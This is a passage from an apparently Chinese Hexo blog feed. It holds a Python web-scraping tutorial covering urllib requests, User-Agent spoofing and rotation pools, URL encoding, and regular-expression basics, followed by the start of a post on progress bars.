spellcheck="true">#打印响应内容</span><span class="token keyword">print</span><span class="token punctuation">(</span>html<span class="token punctuation">)</span></code></pre><p>这样就获得了网页的资源，这是最基础，最简单的程序，如何选择性的爬取其中的内容，是接下来要干的事儿。</p><h3 id="用户代理"><a href="#用户代理" class="headerlink" title="用户代理"></a>用户代理</h3><p>绝大多数网站都具备一定的反爬能力，禁止网爬虫大量地访问网站，所以我们（的程序）需要伪装成人的样子去访问。</p><p><code>User-Agent</code> 即用户代理，简称“UA”，它是一个特殊字符串头。网站服务器通过识别 “UA”来确定用户所使用的操作系统版本、CPU 类型、浏览器版本等信息。而网站服务器则通过判断 UA 来给客户端发送不同的页面。</p><p>本机UA检测工具：<a href="https://useragent.buyaocha.com/">https://useragent.buyaocha.com/</a></p><table><thead><tr><th>系统</th><th>浏览器</th><th>User-Agent字符串</th></tr></thead><tbody><tr><td>Mac</td><td>Chrome</td><td>Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.75 Safari/537.36</td></tr><tr><td>Mac</td><td>Firefox</td><td>Mozilla/5.0 (Macintosh; Intel Mac OS X 10.12; rv:65.0) Gecko/20100101 Firefox/65.0</td></tr><tr><td>Mac</td><td>Safari</td><td>Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15</td></tr><tr><td>Windows</td><td>Edge</td><td>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.140 Safari/537.36 Edge/18.17763</td></tr><tr><td>Windows</td><td>IE</td><td>Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko</td></tr><tr><td>Windows</td><td>Chrome</td><td>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.121 Safari/537.36</td></tr><tr><td>iOS</td><td>Chrome</td><td>Mozilla/5.0 (iPhone; CPU iPhone OS 7_0_4 like Mac OS X) AppleWebKit/537.51.1 (KHTML, like Gecko) CriOS/31.0.1650.18 Mobile/11B554a Safari/8536.25</td></tr><tr><td>iOS</td><td>Safari</td><td>Mozilla/5.0 (iPhone; CPU iPhone OS 8_3 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Version/8.0 Mobile/12F70 Safari/600.1.4</td></tr><tr><td>Android</td><td>Chrome</td><td>Mozilla/5.0 (Linux; Android 4.2.1; M040 Build/JOP40D) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/31.0.1650.59 Mobile Safari/537.36</td></tr><tr><td>Android</td><td>Webkit</td><td>Mozilla/5.0 (Linux; U; Android 4.4.4; zh-cn; M351 Build/KTU84P) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30</td></tr></tbody></table><h4 id="爬虫程序UA信息"><a href="#爬虫程序UA信息" class="headerlink" title="爬虫程序UA信息"></a>爬虫程序UA信息</h4><p>下面，通过向 HTTP 测试网站（<a href="http://httpbin.org/%EF%BC%89%E5%8F%91%E9%80%81">http://httpbin.org/）发送</a> GET 请求来查看请求头信息，从而获取爬虫程序的 UA。代码如下所示：</p><pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#导入模块</span><span class="token keyword">import</span> urllib<span class="token punctuation">.</span>request<span class="token comment" spellcheck="true">#向网站发送get请求</span>response<span class="token operator">=</span>urllib<span class="token punctuation">.</span>request<span class="token punctuation">.</span>urlopen<span class="token punctuation">(</span><span class="token string">'http://httpbin.org/get'</span><span class="token punctuation">)</span>html <span class="token operator">=</span> response<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>html<span class="token punctuation">)</span></code></pre><p>执行</p><pre class=" language-python"><code class="language-python"><span class="token punctuation">{</span>  <span class="token string">"args"</span><span class="token punctuation">:</span> <span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token punctuation">,</span>  <span class="token string">"headers"</span><span class="token punctuation">:</span> <span class="token punctuation">{</span>    <span class="token string">"Accept-Encoding"</span><span class="token punctuation">:</span> <span class="token string">"identity"</span><span class="token punctuation">,</span>    <span class="token string">"Host"</span><span class="token punctuation">:</span> <span class="token string">"httpbin.org"</span><span class="token punctuation">,</span>    <span class="token string">"User-Agent"</span><span class="token punctuation">:</span> <span class="token string">"Python-urllib/3.9"</span><span class="token punctuation">,</span>    <span class="token string">"X-Amzn-Trace-Id"</span><span class="token punctuation">:</span> <span class="token string">"Root=1-62b479db-091019084b3b1c3151df34af"</span>  <span class="token punctuation">}</span><span class="token punctuation">,</span>  <span class="token string">"origin"</span><span class="token punctuation">:</span> <span class="token string">"120.203.237.152"</span><span class="token punctuation">,</span>  <span class="token string">"url"</span><span class="token punctuation">:</span> <span class="token string">"http://httpbin.org/get"</span><span class="token punctuation">}</span></code></pre><p>从输出结果可以看出，User-Agent 竟然是 Python-urllib/3.7，这显然是爬虫程序访问网站。因此就需要重构 User-Agent，将其伪装成“浏览器”访问网站。</p><p>注意：<a href="http://httpbin.org/">httpbin.org </a>这个网站能测试 HTTP 请求和响应的各种信息，比如 cookie、IP、headers 和登录验证等，且支持 GET、POST 等多种方法，对 Web 开发和测试很有帮助。</p><h4 id="重构爬虫UA信息"><a href="#重构爬虫UA信息" class="headerlink" title="重构爬虫UA信息"></a>重构爬虫UA信息</h4><p>下面使用<code>urllib.request.Request()</code>方法重构 User-Agent 信息，代码如下所示：</p><pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> urllib <span class="token keyword">import</span> request<span class="token comment" spellcheck="true"># 定义变量：URL 与 headers</span>url <span class="token operator">=</span> <span class="token string">'http://httpbin.org/get'</span> <span class="token comment" spellcheck="true">#向测试网站发送请求</span><span class="token comment" spellcheck="true"># 重构请求头，伪装成 Mac火狐浏览器访问，可以使用上表中任意浏览器的UA信息</span>headers <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">'User-Agent'</span><span class="token punctuation">:</span> <span class="token string">'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.12; rv:65.0) Gecko/20100101 Firefox/65.0'</span><span class="token punctuation">}</span><span class="token comment" spellcheck="true"># 1、创建请求对象，包装ua信息</span>req <span class="token operator">=</span> request<span class="token punctuation">.</span>Request<span class="token punctuation">(</span>url<span class="token operator">=</span>url<span class="token punctuation">,</span> headers<span class="token operator">=</span>headers<span class="token punctuation">)</span><span class="token comment" spellcheck="true"># 2、发送请求，获取响应对象</span>res <span class="token operator">=</span> request<span class="token punctuation">.</span>urlopen<span class="token punctuation">(</span>req<span class="token punctuation">)</span><span class="token comment" spellcheck="true"># 3、提取响应内容</span>html <span class="token operator">=</span> res<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>html<span class="token punctuation">)</span></code></pre><p>执行</p><pre class=" language-python"><code class="language-python"><span class="token punctuation">{</span>  <span class="token string">"args"</span><span class="token punctuation">:</span> <span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token punctuation">,</span>   <span class="token string">"headers"</span><span class="token punctuation">:</span> <span class="token punctuation">{</span>    <span class="token string">"Accept-Encoding"</span><span class="token punctuation">:</span> <span class="token string">"identity"</span><span class="token punctuation">,</span>     <span class="token string">"Host"</span><span class="token punctuation">:</span> <span class="token string">"httpbin.org"</span><span class="token punctuation">,</span>     <span class="token string">"User-Agent"</span><span class="token punctuation">:</span> <span class="token string">"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.12; rv:65.0) Gecko/20100101 Firefox/65.0"</span><span class="token punctuation">,</span>     <span class="token string">"X-Amzn-Trace-Id"</span><span class="token punctuation">:</span> <span class="token string">"Root=1-62b47e38-5073e563772c786c6da6b3e6"</span>  <span class="token punctuation">}</span><span class="token punctuation">,</span>   <span class="token string">"origin"</span><span class="token punctuation">:</span> <span class="token string">"120.203.237.152"</span><span class="token punctuation">,</span>   <span class="token string">"url"</span><span class="token punctuation">:</span> <span class="token string">"http://httpbin.org/get"</span><span class="token punctuation">}</span></code></pre><h3 id="代理池"><a href="#代理池" class="headerlink" title="代理池"></a>代理池</h3><p>在编写爬虫程序时，一般都会构建一个 User-Agent （用户代理）池，就是把多个浏览器的 UA 信息放进列表中，然后再从中随机选择。构建用户代理池，能够避免总是使用一个 UA 来访问网站，因为短时间内总使用一个 UA 高频率访问的网站，可能会引起网站的警觉，从而封杀掉 IP。</p><h4 id="自定义UA代理池"><a href="#自定义UA代理池" class="headerlink" title="自定义UA代理池"></a>自定义UA代理池</h4><p>构建代理池的方法也非常简单，在您的 Pycharm 工作目录中定义一个 ua_info.py 文件，并将以下 UA 信息以列表的形式粘贴到该文件中，如下所示：</p><pre class=" language-python"><code class="language-python">ua_list <span class="token operator">=</span> <span class="token punctuation">[</span>    <span class="token string">'Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Maxthon 2.0'</span><span class="token punctuation">,</span>    <span class="token string">'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_0) AppleWebKit/535.11 (KHTML, like Gecko) Chrome/17.0.963.56 Safari/535.11'</span><span class="token punctuation">,</span>    <span class="token string">'User-Agent:Opera/9.80 (Windows NT 6.1; U; en) Presto/2.8.131 Version/11.11'</span><span class="token punctuation">,</span>    <span class="token string">'Mozilla/5.0 (Windows NT 6.1; rv:2.0.1) Gecko/20100101 Firefox/4.0.1'</span><span class="token punctuation">,</span>    <span class="token string">'Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0)'</span><span class="token punctuation">,</span>    <span class="token string">'Mozilla/5.0 (Windows; U; Windows NT 6.1; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50'</span><span class="token punctuation">,</span>    <span class="token string">'Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0'</span><span class="token punctuation">,</span>    <span class="token string">' Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1'</span><span class="token punctuation">,</span>    <span class="token string">'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1'</span><span class="token punctuation">,</span>    <span class="token string">' Mozilla/5.0 (Macintosh; Intel Mac OS X 10.6; rv:2.0.1) Gecko/20100101 Firefox/4.0.1'</span><span class="token punctuation">,</span><span class="token punctuation">]</span></code></pre><h4 id="模块随机获取UA"><a href="#模块随机获取UA" class="headerlink" title="模块随机获取UA"></a>模块随机获取UA</h4><p>您也可以使用专门第三方的模块来随机获取浏览器 UA 信息，不过该模块需要单独安装，安装方式如下：</p><pre class=" language-python"><code class="language-python">pip install fake<span class="token operator">-</span>useragent</code></pre><p>例</p><pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> fake_useragent <span class="token keyword">import</span> UserAgent<span class="token comment" spellcheck="true"># 实例化一个对象</span>ua<span class="token operator">=</span>UserAgent<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true"># 随机获取一个ie浏览器ua</span><span class="token keyword">print</span><span class="token punctuation">(</span>ua<span class="token punctuation">.</span>ie<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>ua<span class="token punctuation">.</span>ie<span class="token punctuation">)</span><span class="token comment" spellcheck="true"># 随机获取一个火狐浏览器ua</span><span class="token keyword">print</span><span class="token punctuation">(</span>ua<span class="token punctuation">.</span>firefox<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>ua<span class="token punctuation">.</span>firefox<span class="token punctuation">)</span></code></pre><p>结果</p><pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#随机获取ie的ua信息</span>Mozilla<span class="token operator">/</span><span class="token number">5.0</span> <span class="token punctuation">(</span>compatible<span class="token punctuation">;</span> MSIE <span class="token number">9.0</span><span class="token punctuation">;</span> Windows NT <span class="token number">6.0</span><span class="token punctuation">;</span> Trident<span class="token operator">/</span><span class="token number">4.0</span><span class="token punctuation">;</span> GTB7<span class="token number">.4</span><span class="token punctuation">;</span> InfoPath<span class="token number">.3</span><span class="token punctuation">;</span> SV1<span class="token punctuation">;</span> <span class="token punctuation">.</span>NET CLR <span class="token number">3.1</span><span class="token punctuation">.</span><span class="token number">76908</span><span class="token punctuation">;</span> WOW64<span class="token punctuation">;</span> en<span class="token operator">-</span>US<span class="token punctuation">)</span>Mozilla<span class="token operator">/</span><span class="token number">5.0</span> <span class="token punctuation">(</span>compatible<span class="token punctuation">;</span> MSIE <span class="token number">9.0</span><span class="token punctuation">;</span> Windows NT <span class="token number">6.1</span><span class="token punctuation">;</span> Win64<span class="token punctuation">;</span> x64<span class="token punctuation">;</span> Trident<span class="token operator">/</span><span class="token number">5.0</span>    <span class="token comment" spellcheck="true">#随机获取火狐的ua信息</span>Mozilla<span class="token operator">/</span><span class="token number">5.0</span> <span class="token punctuation">(</span>Macintosh<span class="token punctuation">;</span> Intel Mac OS X <span class="token number">10.8</span><span class="token punctuation">;</span> rv<span class="token punctuation">:</span><span class="token number">21.0</span><span class="token punctuation">)</span> Gecko<span class="token operator">/</span><span class="token number">20100101</span> Firefox<span class="token operator">/</span><span class="token number">21.0</span>Mozilla<span class="token operator">/</span><span class="token number">5.0</span> <span class="token punctuation">(</span>Windows NT <span class="token number">5.0</span><span class="token punctuation">;</span> rv<span class="token punctuation">:</span><span class="token number">21.0</span><span class="token punctuation">)</span> Gecko<span class="token operator">/</span><span class="token number">20100101</span> Firefox<span class="token operator">/</span><span class="token number">21.0</span></code></pre><h3 id="URL编码-解码详解"><a href="#URL编码-解码详解" class="headerlink" title="URL编码/解码详解"></a>URL编码/解码详解</h3><p>当 URL 路径或者查询参数中，带有中文或者特殊字符的时候，就需要对 URL 进行编码（采用十六进制编码格式）。URL 编码的原则是使用安全字符去表示那些不安全的字符。</p><h4 id="URL基本组成"><a href="#URL基本组成" class="headerlink" title="URL基本组成"></a>URL基本组成</h4><p>URL 是由一些简单的组件构成，比如协议、域名、端口号、路径和查询字符串等，示例如下：</p><pre class=" language-python"><code class="language-python">http<span class="token punctuation">:</span><span class="token operator">//</span>www<span class="token punctuation">.</span>example<span class="token punctuation">.</span>net<span class="token operator">/</span>index?param<span class="token operator">=</span><span class="token number">10</span></code></pre><p>URL 中规定了一些具有特殊意义的字符，常被用来分隔两个不同的 URL 组件，这些字符被称为<strong>保留字符</strong>。例如：</p><ul><li>冒号：用于分隔协议和主机组件，斜杠用于分隔主机和路径</li><li><code>?</code>：用于分隔路径和查询参数等。</li><li><code>=</code>用于表示查询参数中的键值对。</li><li><code>&amp;</code>符号用于分隔查询多个键值对。</li></ul><pre class=" language-txt"><code class="language-txt">其余常用的保留字符有：/ . ... # @ $ + ; %</code></pre><h4 id="哪些字符需要编码"><a href="#哪些字符需要编码" class="headerlink" title="哪些字符需要编码"></a>哪些字符需要编码</h4><p>URL 中只允许使用 ASCII 字符集可以显示的字符，比如英文字母、数字、和<code>- _ . ~ ! *</code>这 6 个<strong>特殊字符</strong></p><p>不属于 ASCII 字符集的字符时，就要使用特殊的符号对该字符进行编码。另外就是保留字符和不安全字符进行编码。不安全字符有</p><pre class=" language-url"><code class="language-url">[ ] < > " "  { } | \ ^ * · ‘ ’ 等</code></pre><p>不安全字符和保留字符的说明</p><table><thead><tr><th>字符</th><th>含义</th><th>十六进制值编码</th></tr></thead><tbody><tr><td>+</td><td>URL 中 + 号表示空格</td><td>%2B</td></tr><tr><td>空格</td><td>URL中的空格可以编码为 + 号或者 %20</td><td>%20</td></tr><tr><td>/</td><td>分隔目录和子目录</td><td>%2F</td></tr><tr><td>?</td><td>分隔实际的 URL 和参数</td><td>%3F</td></tr><tr><td>%</td><td>指定特殊字符</td><td>%25</td></tr><tr><td>#</td><td>表示书签</td><td>%23</td></tr><tr><td>&amp;</td><td>URL 中指定的参数间的分隔符</td><td>%26</td></tr><tr><td>=</td><td>URL 中指定参数的值</td><td>%3D</td></tr></tbody></table><p>下面简单总结一下，哪些字符需要编码，分为以下三种情况：</p><ul><li>ASCII 表中没有对应的可显示字符，例如，汉字。</li><li>不安全字符，包括：<code># ”% &lt;&gt; [] {} | \ ^  </code>以及反引号 。</li><li>部分保留字符，即 <code>&amp; / : ; = ? @</code> 。</li></ul><h3 id="Python实现编码与解码"><a href="#Python实现编码与解码" class="headerlink" title="Python实现编码与解码"></a>Python实现编码与解码</h3><p>Python 的标准库<code>urllib.parse</code>模块中提供了用来编码和解码的方法，分别是 urlencode() 与 unquote() 方法。</p><h4 id="1-编码urlencode"><a href="#1-编码urlencode" class="headerlink" title="1) 编码urlencode()"></a>1) 编码urlencode()</h4><p>下面以百度搜索为例进行讲解。首先打开百度首页，在搜索框中输入“爬虫”，然后点击“百度一下”。当搜索结果显示后，此时地址栏的 URL 信息，如下所示：</p><pre class=" language-python"><code class="language-python">https<span class="token punctuation">:</span><span class="token operator">//</span>www<span class="token punctuation">.</span>baidu<span class="token punctuation">.</span>com<span class="token operator">/</span>s?wd<span class="token operator">=</span>爬虫<span class="token operator">&amp;</span>rsv_spt<span class="token operator">=</span><span class="token number">1</span><span class="token operator">&amp;</span>rsv_iqid<span class="token operator">=</span><span class="token number">0xa3ca348c0001a2ab</span><span class="token operator">&amp;</span>issp<span class="token operator">=</span><span class="token number">1</span><span class="token operator">&amp;</span>f<span class="token operator">=</span><span class="token number">8</span><span class="token operator">&amp;</span>rsv_bp<span class="token operator">=</span><span class="token number">1</span><span class="token operator">&amp;</span>rsv_idx<span class="token operator">=</span><span class="token number">2</span><span class="token operator">&amp;</span>ie<span class="token operator">=</span>utf<span class="token number">-8</span><span class="token operator">&amp;</span>tn<span class="token operator">=</span>baiduhome_pg<span class="token operator">&amp;</span>rsv_enter<span class="token operator">=</span><span class="token number">1</span><span class="token operator">&amp;</span>rsv_dl<span class="token operator">=</span>ib<span class="token operator">&amp;</span>rsv_sug3<span class="token operator">=</span><span class="token number">8</span><span class="token operator">&amp;</span>rsv_sug1<span class="token operator">=</span><span class="token number">7</span><span class="token operator">&amp;</span>rsv_sug7<span class="token operator">=</span><span class="token number">101</span></code></pre><p>删除多于查询字符串，对第一个字符串进行编码</p><pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#导入parse模块</span><span class="token keyword">from</span> urllib <span class="token keyword">import</span> parse<span class="token comment" spellcheck="true">#构建查询字符串字典</span>query_string <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">'wd'</span> <span class="token punctuation">:</span> <span class="token string">'爬虫'</span><span class="token punctuation">}</span><span class="token comment" spellcheck="true">#调用parse模块的urlencode()进行编码</span>result <span class="token operator">=</span> parse<span class="token punctuation">.</span>urlencode<span class="token punctuation">(</span>query_string<span class="token punctuation">)</span><span class="token comment" spellcheck="true">#使用format函数格式化字符串，拼接url地址</span>url <span class="token operator">=</span> <span class="token string">'http://www.baidu.com/s?{}'</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>result<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>url<span class="token punctuation">)</span></code></pre><p>也可以使用 quote(string) 方法实现编码</p><pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> urllib <span class="token keyword">import</span> parse<span class="token comment" spellcheck="true">#注意url的书写格式，和 urlencode存在不同</span>url <span class="token operator">=</span> <span class="token string">'http://www.baidu.com/s?wd={}'</span>word <span class="token operator">=</span> input<span class="token punctuation">(</span><span class="token string">'请输入要搜索的内容:'</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#quote()只能对字符串进行编码</span>query_string <span class="token operator">=</span> parse<span class="token punctuation">.</span>quote<span class="token punctuation">(</span>word<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>url<span class="token punctuation">.</span>format<span class="token punctuation">(</span>query_string<span class="token punctuation">)</span><span class="token punctuation">)</span></code></pre><p>执行</p><pre class=" language-python"><code class="language-python">输入：请输入要搜索的内容<span class="token punctuation">:</span>编程帮www<span class="token punctuation">.</span>biancheng<span class="token punctuation">.</span>net输出：http<span class="token punctuation">:</span><span class="token operator">//</span>www<span class="token punctuation">.</span>baidu<span class="token punctuation">.</span>com<span class="token operator">/</span>s?wd<span class="token operator">=</span><span class="token operator">%</span>E7<span class="token operator">%</span>BC<span class="token operator">%</span><span class="token number">96</span><span class="token operator">%</span>E7<span class="token operator">%</span>A8<span class="token operator">%</span><span class="token number">8B</span><span class="token operator">%</span>E5<span class="token operator">%</span>B8<span class="token operator">%</span>AEwww<span class="token punctuation">.</span>biancheng<span class="token punctuation">.</span>net</code></pre><p>两则的差异就是一个是字典，一个是字符串的一个编码。</p><h4 id="2-解码unquote-string"><a href="#2-解码unquote-string" class="headerlink" title="2) 解码unquote(string)"></a>2) 解码unquote(string)</h4><p>对url进行还原</p><pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> urllib <span class="token keyword">import</span> parsestring <span class="token operator">=</span> <span class="token string">'%E7%88%AC%E8%99%AB'</span>result <span class="token operator">=</span> parse<span class="token punctuation">.</span>unquote<span class="token punctuation">(</span>string<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>result<span class="token punctuation">)</span></code></pre><p>执行</p><pre class=" language-python"><code class="language-python">爬虫</code></pre><h4 id="3-URL地址拼接方式"><a href="#3-URL地址拼接方式" class="headerlink" title="3) URL地址拼接方式"></a>3) URL地址拼接方式</h4><p>三种拼接 URL 地址的方法。除了使用 format() 函数外，还可以使用字符串相加，以及字符串占位符</p><pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true"># 1、字符串相加</span>  baseurl <span class="token operator">=</span> <span class="token string">'http://www.baidu.com/s?'</span>  params<span class="token operator">=</span><span class="token string">'wd=%E7%88%AC%E8%99%AB'</span>  url <span class="token operator">=</span> baseurl <span class="token operator">+</span> params<span class="token comment" spellcheck="true"># 2、字符串格式化（占位符）</span>  params<span class="token operator">=</span><span class="token string">'wd=%E7%88%AC%E8%99%AB'</span>  url <span class="token operator">=</span> <span class="token string">'http://www.baidu.com/s?%s'</span><span class="token operator">%</span> params<span class="token comment" spellcheck="true"># 3、format()方法</span>  url <span class="token operator">=</span> <span class="token string">'http://www.baidu.com/s?{}'</span>  params<span class="token operator">=</span><span class="token string">'wd=%E7%88%AC%E8%99%AB'</span>  url <span class="token operator">=</span> url<span class="token punctuation">.</span>format<span class="token punctuation">(</span>params<span class="token punctuation">)</span></code></pre><h2 id="Cx-Regular-expression"><a href="#Cx-Regular-expression" class="headerlink" title="Cx Regular expression"></a>Cx Regular expression</h2><h3 id="元字符"><a href="#元字符" class="headerlink" title="元字符"></a>元字符</h3><table><thead><tr><th>元字符</th><th>匹配内容</th></tr></thead><tbody><tr><td>.</td><td>匹配除换行符以外的任意字符</td></tr><tr><td>\w</td><td>匹配所有普通字符(数字、字母或下划线)</td></tr><tr><td>\s</td><td>匹配任意的空白符</td></tr><tr><td>\d</td><td>匹配数字</td></tr><tr><td>\n</td><td>匹配一个换行符</td></tr><tr><td>\t</td><td>匹配一个制表符</td></tr><tr><td>\b</td><td>匹配一个单词的结尾</td></tr><tr><td>^</td><td>匹配字符串的开始位置</td></tr><tr><td>$</td><td>匹配字符串的结尾位置</td></tr><tr><td>\W</td><td>匹配非字母或数字或下划线</td></tr><tr><td>\D</td><td>匹配非数字</td></tr><tr><td>\S</td><td>匹配非空白符</td></tr><tr><td>a|b</td><td>匹配字符 a 或字符 b</td></tr><tr><td>()</td><td>正则表达式分组所用符号，匹配括号内的表达式，表示一个组。</td></tr><tr><td>[…]</td><td>匹配字符组中的字符</td></tr><tr><td>[^…]</td><td>匹配除了字符组中字符的所有字符</td></tr></tbody></table><h4 id="量词"><a href="#量词" class="headerlink" title="量词"></a>量词</h4><table><thead><tr><th>量词</th><th>用法说明</th></tr></thead><tbody><tr><td>*</td><td>重复零次或者更多次</td></tr><tr><td>+</td><td>重复一次或者更多次</td></tr><tr><td>？</td><td>重复0次或者一次</td></tr><tr><td>{n}</td><td>重复n次</td></tr><tr><td>{n,}</td><td>重复n次或者更多次</td></tr><tr><td>{n,m}</td><td>重复n到m次</td></tr></tbody></table><h4 id="字符组"><a href="#字符组" class="headerlink" title="字符组"></a>字符组</h4><table><thead><tr><th>正则</th><th>待匹配字符</th><th>匹配结果</th><th>说明</th></tr></thead><tbody><tr><td>[0123456789]</td><td>8</td><td>True</td><td>在一个字符组里枚举所有字符，字符组里的任意一个字符 和”待匹配字符”相同都视为可以匹配。</td></tr><tr><td>[0123456789]</td><td>a</td><td>False</td><td>由于字符组中没有 “a” 字符，所以不能匹配。</td></tr><tr><td>[0-9]</td><td>7</td><td>True</td><td>也可以用-表示范围，[0-9] 就和 [0123456789] 是一个意思。</td></tr><tr><td>[a-z]</td><td>s</td><td>True</td><td>同样的如果要匹配所有的小写字母，直接用 [a-z] 就可以表示。</td></tr><tr><td>[A-Z]</td><td>B</td><td>True</td><td>[A-Z] 就表示所有的大写字母。</td></tr><tr><td>[0-9a-fA-F]</td><td>e</td><td>True</td><td>可以匹配数字，大小写形式的 a～f，用来验证十六进制字符。</td></tr></tbody></table><h3 id="贪婪模式非贪婪模式"><a href="#贪婪模式非贪婪模式" class="headerlink" title="贪婪模式非贪婪模式"></a>贪婪模式非贪婪模式</h3><p>正则表达式默认为贪婪匹配，也就是尽可能多的向后匹配字符，比如 {n,m} 表示匹配前面的内容出现 n 到 m 次（n 小于 m），在贪婪模式下，首先以匹配 m 次为目标，而在非贪婪模式是尽可能少的向后匹配内容，也就是说匹配 n 次即可。</p><p>贪婪模式转换为非贪婪模式的方法很简单，在元字符后添加“?”即可实现，如下所示：</p><table><thead><tr><th>元字符(贪婪模式)</th><th>非贪婪模式</th></tr></thead><tbody><tr><td>*</td><td>*?</td></tr><tr><td>+</td><td>+？</td></tr><tr><td>？</td><td>??</td></tr><tr><td>{n,m}</td><td>{n,m}？</td></tr></tbody></table><h3 id="正则表达式转义"><a href="#正则表达式转义" class="headerlink" title="正则表达式转义"></a>正则表达式转义</h3><p>如果使用正则表达式匹配特殊字符时，则需要在字符前加<code>\</code>表示转义。常见的特殊字符如下：</p><pre><code>* + ? ^ $ [] () {} | \</code></pre><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kity@2.0.4/dist/kity.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text/javascript" src="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.css">]]></content>
      
      
      <categories>
          
          <category> Python </category>
          
      </categories>
      
      
        <tags>
            
            <tag> spider </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Python进度条</title>
      <link href="posts/703e.html"/>
      <url>posts/703e.html</url>
      
        <content type="html"><![CDATA[<blockquote><p>基础永远值得花费90%的精力去学习加强。认识实践的重要性。</p></blockquote><h2 id="Ax-Python进度条的实现方法"><a href="#Ax-Python进度条的实现方法" class="headerlink" title="Ax Python进度条的实现方法"></a>Ax Python进度条的实现方法</h2><p>进度条提供了可视化的进度情况，人我们不再误以为程序是卡死状态。</p><h3 id="普通进度条"><a href="#普通进度条" class="headerlink" title="普通进度条"></a>普通进度条</h3><pre class=" language-python"><code class="language-python"><span class="token keyword">import</span> sys<span class="token keyword">import</span> time<span class="token keyword">def</span> <span class="token function">progress_bar</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">101</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"\r"</span><span class="token punctuation">,</span> end<span class="token operator">=</span><span class="token string">""</span><span class="token punctuation">)</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Download progress: {}%："</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">"▋"</span> <span class="token operator">*</span> <span class="token punctuation">(</span>i <span class="token operator">//</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">,</span> end<span class="token operator">=</span><span class="token string">""</span><span class="token punctuation">)</span>        sys<span class="token punctuation">.</span>stdout<span class="token punctuation">.</span>flush<span class="token punctuation">(</span><span class="token punctuation">)</span>        time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">0.05</span><span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>    progress_bar<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true"># 当 __name__ 值为 "__main__" 的即为脚本，反之，即为导入的模块或者库（方法）。</span><span class="token comment" spellcheck="true"># __name__在本文件执行则返回__main__，在其它文件调用则返回执行文件的名字。</span></code></pre><p>效果</p><pre class=" language-python"><code class="language-python">Download progress<span class="token punctuation">:</span> <span class="token number">100</span><span class="token operator">%</span>： ▋▋▋▋▋▋▋▋▋▋▋▋▋▋▋▋▋▋▋▋▋▋▋▋▋▋▋▋▋▋▋▋▋▋▋▋▋▋▋▋▋▋▋▋▋▋▋▋▋▋</code></pre><h3 id="带时间进度条"><a href="#带时间进度条" class="headerlink" 